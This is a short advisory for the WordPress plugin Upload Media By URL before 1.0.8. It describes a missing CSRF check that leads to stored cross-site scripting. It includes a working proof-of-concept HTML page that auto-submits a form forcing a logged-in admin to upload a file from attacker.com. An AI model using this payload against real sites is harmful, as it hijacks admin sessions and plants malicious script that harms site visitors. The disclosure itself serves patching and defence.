## WordPress Plugin Vulnerabilities

# Upload Media By URL < 1.0.8 - Stored XSS via CSRF

### Description

The plugin does not have CSRF check when uploading files, which could allow attackers to make logged in admins upload files (including HTML containing JS code for users with the unfiltered\_html capability) on their behalf.

### Proof of Concept

Have a logged in user with the unfiltered\_html capability open an HTML file containing the following (this will make them upload the xss.html file):
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/wp-admin/upload.php" method="POST">
<input type="hidden" name="multiurl" value="https://attacker.com/xss.html" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
